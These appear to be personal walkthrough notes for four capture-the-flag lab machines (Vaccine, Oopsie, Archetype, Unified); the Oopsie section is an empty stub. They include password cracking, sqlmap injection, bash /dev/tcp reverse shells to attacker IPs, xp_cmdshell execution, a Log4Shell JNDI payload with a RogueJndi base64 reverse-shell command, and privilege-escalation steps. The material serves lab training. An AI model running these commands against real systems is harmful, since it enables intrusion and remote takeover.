

# Vaccine

-> uses primarily ftp (port 20) and http (port 80)

firstly use ftp to grab the backup.zip

-> use zip2john and john to grab the zip encrypted pass and decode the source code 
```bash
zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
```

-> now you can login and see a database

```bash
curl -L -c cookies.txt "http://{MACHINE_IP} -d "username=admin&password={password}"
```

-> after getting the cookies then use **sqlmap**

```bash
# Target the search parameter of the site
sqlmap -u http://{MACHINE_IP}/dashboard.php?search=text cookie="{PHPSESSID=COOKIE}" -p search

# After finding vulnerabilities then use --os-root
sqlmap -u http://{MACHINE_IP}/dashboard.php?search=text cookie="{PHPSESSID=COOKIE}" -p search --os-root
```

-> after getting into a shell, try to get a reverse shell using **nc** (netcat)

```bash
nc -lvnp 4444
```

-> from the sql terminal spawn an interactive bash shell to redirect its i/o outgoingly 

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.100/4444 0>&1'
```

-> do a PTY upgrade the be able to do sudo -l

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

-> first find the password of the root, which is located in /var/www/html/dashboard.php

then do: 
```bash
sudo -l 
```

sudo -l returns:

```bash
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

# Means that we can run vi on pg_hba.conf 
```

-> run vi as sudo on pg_hba.conf

-> then do a **vi escape** by spawning an interactive bash in vi:

```bash
:!/bin/bash
```

Finally, the flag is in the home directory as root.


# Oopsie

-> 22/tcp ssh
-> 80/tcp http

-> we can access a website and we can take a look at target burpsuite, # Traversing the directory gives us `cdn-cgi/login`

```bash


```


# Archetype

-> 135/tcp msrpc
-> 139/tcp netbios ssn
-> 445/tcp microsoft-ds
->1433/tcp ms-sql-s
-> 5985/tcp http

Primarily be using **SMB, impackets-mssqlclient**, **evil-winrm**

```bash
# Retrieve the shares
smbclient -L {IP} 

```

-> we then get the backups share which included `prod.dtsConfig`, and grab the credentials of id and password, to then log on to mssql using `impacket-mssqlclient`

```bash
# talk to MS SQL over its native wire protocol TDS, rather than SMB/winRM
impacket-mssqlclient sql_svc:'M3g4c0rp123'@{IP_ADDRESS} -windows-auth

-windows-auth # auth using windows/NTLM auth rather than SQL servers native SQL auth
```


-> follow the https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/ , for documentation fo **xp_cmdshell**.

```bash
#Enable xp_cmdshell first after login
enable_xp_cmdshell
xp_cmdshell whoami
```

-> https://www.revshells.com/ for generating reverse shell payload for a given situation (PS, bash, PHP, netcat, etc)

```bash
# Copy the payload after the command
xp_cmdshell {PAYLOAD}

# make sure u had a listener ready before
```

-> since we need to bring winpeas, to find vulnerabilities to exploit in the machine

```bash
# Inside the folder that has winPEASany.exe
python -m http.server 8000
```

-> from the connected reverse shell, we navigate into C:\backups, because when I tried to curl into other folders it wouldn't work

```bash
# in C:\backups
curl.exe http://{tun0-interface-IP}/winPEASSany.exe -o winpeas.exe
```

-> run winPEAS

```css
# inside winPEAS we found
??????????? PowerShell Settings (T1059.001)
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B

```

-> this is the file that stores powershell history inputs, when we cat it we can find the credentials of the administrator: `MEGACORP_4dm1n!!`

```bash
# connect using evil-winrm
evil-winrm -i {IP_ADDRESS} -u administrator -p 'MEGACORP_4dm1n!!'
```

-> navigate to both desktops to find the flag.



# Unified

-> has ports 22/tcp ssh 
->6789/tcp   ibm-db2-admin?
->8080/tcp tcpwrapped    
->8443/tcp open  ssl/https-alt

-> connect to the website by typing the 
```css
https://{IP_ADDRESS:8443
```

->unifi website 6.4.54, has an exploit, vulnerable to log4j rce attack CVE-2021-44228 (log4shell)

#### The Log4Shell attack flow

1. curl sends the payload to the target's login API. The payload contains a JNDI lookup string.
2. The vulnerable application processes the input. If the relevant Log4j logging path evaluates the lookup, the target initiates an LDAP request to your RogueJndi server.
3. RogueJndi responds to the LDAP lookup. It supplies a JNDI response configured to provide a command-related payload.
4. The target processes the response. If the required Java and application conditions are met, the command executes on the target.
5. The command contains your callback address. It specifies your Kali IP (10.10.14.95) and port (4444).
6. Netcat receives the incoming TCP connection because it's listening on that port.

-> we can use burp suite to try to make an ldap connection and see if its vulnerable by using tcpdump on port 

```bash
sudo tcpdump -i tun0 -n port 1389
```

-> then send a ldap connection request payload from burp suite

```json
{
"username":"wdasd",
  "password":"wwdasd",
  "remember":"${jndi:ldap://10.10.14.95:1389/o=tomcat}",
 "strict":true
}
```

-> after verifying the logs, then we can try to set a tool to exploit Java Naming and Directory Interface (JNDI) injection vulnerabilities

- makes a dual server, malicious LDAP and HTTP, makes LDAP endpoint URLs and map them to a specific exploit technique for different vers and envs (tomcat, websphere, groovy)
- vulnerable java app do a JNDI lookup on the generated LDAP URLs, RogueJNDI responds with a malicious reference or serialized object, and tricks server to fetch and executing the payload

-> https://github.com/veracode-research/rogue-jndi
-> from here we can clone and build the rogue jndi tool, then start crafting the interactive bash payload, encode it in base64

```bash
echo 'bash -c bash -i >&/dev/tcp/{YOUR_tun0_IP}/4444 0>&1' | base64
```

-> after encoding, run the java executable with your own hostname and hash


```bash
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,HASH}|{base64,-d}|{bash,-i}" --hostname "{YOUR_tun0_IP}"
```

-> then set up netcat and then send the burp request again.

-> boom! reverse shell!

-> you can find the mongo process by using `ps aux`, we find that it has port 27117

```bash
mongo --port 27117   --> connect to the mongodb
```

-> log in to mongo then enumerate all the collections and databases

```bash
show dbs
use <database>

show collections
db.<collections>.find() # we can find the x_shadow and update it

db.<collections>.update({"name":"administrator"},{$set:{"x_shadow":"{HASHED_PASSWORD}"}})
```

-> use the updated credentials to log into the unifi website

-> grab the ssh credentials in settings and ssh in

```bash
ssh {IP_ADDRESS} -l root

# it will prompt you for the password
# which is:
-NotACrackablePassword4U2022-
```


-> get the flag!